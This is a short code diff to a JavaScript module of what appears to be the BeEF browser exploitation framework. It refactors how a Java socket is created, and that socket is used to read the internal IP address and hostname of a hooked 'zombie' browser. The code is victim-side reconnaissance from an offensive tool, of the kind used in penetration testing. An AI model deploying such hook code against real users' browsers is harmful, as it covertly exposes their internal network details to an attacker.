@@ -5,7 +5,22 @@
  */
 beef.net.local = {
 	
-	sock: new java.net.Socket(),
+	sock: false,
+	
+	/**
+	 * Initializes the java socket. We have to use this method because
+	 * some browsers do not have java installed or it is not accessible.
+	 * in which case creating a socket directly generates an error. So this code
+	 * is invalid:
+	 * sock: new java.net.Socket();
+	 */
+	initializeSocket: function() {
+		if(! beef.browser.hasJava()) return -1;
+		
+		this.sock = new java.net.Socket();
+		
+		return 1;
+	},
 	
 	/**
 	 * Returns the internal IP address of the zombie.
@@ -14,6 +29,8 @@ beef.net.local = {
 	 */
 	getLocalAddress: function() {
 		if(! beef.browser.hasJava()) return -1;
+		
+		this.initializeSocket();
 		
 		try {
 			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
@@ -30,6 +47,8 @@ beef.net.local = {
 	 */
 	getLocalHostname: function() {
 		if(! beef.browser.hasJava()) return -1;
+		
+		this.initializeSocket();
 		
 		try {
 			this.sock.bind(new java.net.InetSocketAddress('0.0.0.0', 0));
